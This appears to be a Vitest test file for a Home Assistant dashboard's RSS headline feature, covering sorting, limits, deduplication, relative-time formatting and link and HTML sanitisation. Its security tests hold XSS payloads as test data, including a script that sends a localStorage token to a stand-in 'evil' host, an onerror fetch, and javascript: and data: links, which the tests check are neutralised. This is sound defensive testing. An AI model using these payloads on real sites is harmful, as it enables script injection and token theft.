// @vitest-environment jsdom
import { describe, it, expect } from 'vitest';
import type { HassEntities } from 'home-assistant-js-websocket';
import {
  projectHomeNews,
  fmtRelative,
  NEWS_LIMIT,
  type NewsHeadline,
} from './homeNews';
import { sanitizeHtml } from '../../utils/sanitizeHtml';

// Home overview RSS newsfeed — pure-projection + security tests (feat/home-rss).
//
// Covers (per the build brief):
//   • headline projection / sort (newest-first) / limit (cap)
//   • the sanitizer applied to feed HTML keeps headlines XSS-safe (no script /
//     javascript: / on* survives)
//   • empty / unavailable-feed state is graceful (present:false, no headlines)
//   • relative-time formatting
//   • the projection never produces a non-http(s) link (no script-URI tap)

const NOW = new Date('2026-06-10T12:00:00Z').getTime();

const ent = (
  entity_id: string,
  state: string,
  attributes: Record<string, any> = {},
): any => ({
  entity_id,
  state,
  attributes,
  last_changed: '2026-06-10T11:30:00Z',
  last_updated: '2026-06-10T11:30:00Z',
  context: { id: '', parent_id: null, user_id: null },
});

const feed = (...ents: any[]): HassEntities => {
  const f: any = {};
  for (const e of ents) f[e.entity_id] = e;
  return f;
};

// A demo feedreader-backed sensor: state = headline count, attributes.entries =
// the headline list (the shape the b-panels tier binds to generically).
const newsSensor = (entries: any[], extra: Record<string, any> = {}) =>
  ent('sensor.home_newsfeed', String(entries.length), {
    friendly_name: 'NPR News',
    entries,
    ...extra,
  });

describe('projectHomeNews — projection / sort / limit', () => {
  it('returns graceful empty defaults when no feed entity exists', () => {
    const v = projectHomeNews({} as HassEntities);
    expect(v.present).toBe(false);
    expect(v.available).toBe(false);
    expect(v.headlines).toEqual([]);
    expect(v.entityId).toBeNull();
  });

  it('projects headlines (title + source + link + published) from a feed sensor', () => {
    const v = projectHomeNews(
      feed(
        newsSensor([
          { title: 'Markets rally', link: 'https://example.com/a', published: '2026-06-10T11:00:00Z', source: 'NPR' },
        ]),
      ),
    );
    expect(v.present).toBe(true);
    expect(v.available).toBe(true);
    expect(v.entityId).toBe('sensor.home_newsfeed');
    expect(v.headlines).toHaveLength(1);
    const h = v.headlines[0];
    expect(h.title).toBe('Markets rally');
    expect(h.link).toBe('https://example.com/a');
    expect(h.source).toBe('NPR');
    expect(h.publishedIso).toBe('2026-06-10T11:00:00.000Z');
  });

  it('sorts newest-first by published timestamp', () => {
    const v = projectHomeNews(
      feed(
        newsSensor([
          { title: 'Older', link: 'https://e/1', published: '2026-06-10T08:00:00Z' },
          { title: 'Newest', link: 'https://e/2', published: '2026-06-10T11:55:00Z' },
          { title: 'Middle', link: 'https://e/3', published: '2026-06-10T10:00:00Z' },
        ]),
      ),
    );
    expect(v.headlines.map((h) => h.title)).toEqual(['Newest', 'Middle', 'Older']);
  });

  it('places undated items after dated ones (stable sink)', () => {
    const v = projectHomeNews(
      feed(
        newsSensor([
          { title: 'No date' },
          { title: 'Dated', published: '2026-06-10T11:00:00Z' },
        ]),
      ),
    );
    expect(v.headlines.map((h) => h.title)).toEqual(['Dated', 'No date']);
  });

  it('caps to NEWS_LIMIT and honours an explicit limit override', () => {
    const many = Array.from({ length: 20 }, (_, i) => ({
      title: `H${i}`,
      published: `2026-06-10T${String(10).padStart(2, '0')}:${String(i).padStart(2, '0')}:00Z`,
    }));
    expect(projectHomeNews(feed(newsSensor(many))).headlines).toHaveLength(NEWS_LIMIT);
    expect(projectHomeNews(feed(newsSensor(many)), { limit: 3 }).headlines).toHaveLength(3);
  });

  it('de-dupes repeated titles (feeds repeat across refreshes)', () => {
    const v = projectHomeNews(
      feed(
        newsSensor([
          { title: 'Same headline', published: '2026-06-10T11:00:00Z' },
          { title: 'same headline', published: '2026-06-10T10:00:00Z' },
        ]),
      ),
    );
    expect(v.headlines).toHaveLength(1);
  });

  it('falls back to the feed friendly_name when an item has no source', () => {
    const v = projectHomeNews(feed(newsSensor([{ title: 'X', published: '2026-06-10T11:00:00Z' }])));
    expect(v.headlines[0].source).toBe('NPR News');
  });

  it('binds to an explicitly configured entity id', () => {
    const v = projectHomeNews(
      feed(
        ent('sensor.custom_feed', '1', { entries: [{ title: 'Custom' }] }),
        newsSensor([{ title: 'Auto' }]),
      ),
      { newsEntityId: 'sensor.custom_feed' },
    );
    expect(v.entityId).toBe('sensor.custom_feed');
    expect(v.headlines[0].title).toBe('Custom');
  });

  it('reports unavailable feed as present-but-unavailable with no headlines', () => {
    const v = projectHomeNews(feed(ent('sensor.home_newsfeed', 'unavailable', { entries: [] })));
    // No entries-shaped attrs with titles → not auto-detected as a feed.
    expect(v.present).toBe(false);
  });

  it('a configured-but-unavailable feed reports present:true, available:false', () => {
    const v = projectHomeNews(
      feed(ent('sensor.home_newsfeed', 'unavailable', {})),
      { newsEntityId: 'sensor.home_newsfeed' },
    );
    expect(v.present).toBe(true);
    expect(v.available).toBe(false);
    expect(v.headlines).toEqual([]);
  });
});

describe('projectHomeNews — security (M-2)', () => {
  it('drops non-http(s) links (javascript:/data:/relative → empty)', () => {
    const v = projectHomeNews(
      feed(
        newsSensor([
          { title: 'A', link: 'javascript:steal()' },
          { title: 'B', link: 'data:text/html,<script>x</script>' },
          { title: 'C', link: '/relative/path' },
          { title: 'D', link: 'https://safe.example/ok' },
        ]),
      ),
      { limit: 50 },
    );
    const byTitle = (t: string) => v.headlines.find((h) => h.title === t) as NewsHeadline;
    expect(byTitle('A').link).toBe('');
    expect(byTitle('B').link).toBe('');
    expect(byTitle('C').link).toBe('');
    expect(byTitle('D').link).toBe('https://safe.example/ok');
  });

  it('strips obfuscated control-char-laced javascript: links', () => {
    const v = projectHomeNews(
      feed(newsSensor([{ title: 'X', link: 'java\tscript:alert(1)' }])),
    );
    expect(v.headlines[0].link).toBe('');
  });

  it('keeps headline titles XSS-safe once run through the shared sanitizer', () => {
    // The renderer (HomeNewsTicker) passes every title through sanitizeHtml.
    // A hostile feed shipping a <script>/onerror payload in the title must come
    // out inert — no script tag, no event handler, no javascript: survives.
    const hostile = [
      '<script>fetch("//evil/"+localStorage.token)</script>Breaking',
      '<img src=x onerror="fetch(\'//evil\')">Headline',
      '<a href="javascript:alert(1)">Tap me</a>',
    ];
    for (const dirty of hostile) {
      const out = sanitizeHtml(dirty).toLowerCase();
      expect(out).not.toContain('<script');
      expect(out).not.toContain('onerror');
      expect(out).not.toContain('javascript:');
    }
  });

  it('projection itself never emits an href/script vector in any field', () => {
    const v = projectHomeNews(
      feed(
        newsSensor([
          { title: '<script>x</script>', link: 'javascript:1', source: '<b>onclick</b>' },
        ]),
      ),
    );
    // The projection passes title/source through verbatim (the renderer
    // sanitizes), but the LINK — the one field used as an href — is always
    // http(s)-or-empty, so a bad link can never become a script-URI tap target.
    expect(v.headlines[0].link).toBe('');
  });
});

describe('fmtRelative', () => {
  it('formats relative ages (now / m / h / d / date)', () => {
    expect(fmtRelative(new Date(NOW - 10_000).toISOString(), NOW)).toBe('now');
    expect(fmtRelative(new Date(NOW - 5 * 60_000).toISOString(), NOW)).toBe('5m');
    expect(fmtRelative(new Date(NOW - 3 * 3_600_000).toISOString(), NOW)).toBe('3h');
    expect(fmtRelative(new Date(NOW - 2 * 86_400_000).toISOString(), NOW)).toBe('2d');
    // > 7 days → a short calendar date (locale-formatted, just assert non-empty).
    expect(fmtRelative(new Date(NOW - 30 * 86_400_000).toISOString(), NOW)).not.toBe('');
  });

  it('treats a future timestamp as "now" and a missing/invalid one as empty', () => {
    expect(fmtRelative(new Date(NOW + 60_000).toISOString(), NOW)).toBe('now');
    expect(fmtRelative(null, NOW)).toBe('');
    expect(fmtRelative('not-a-date', NOW)).toBe('');
  });
});
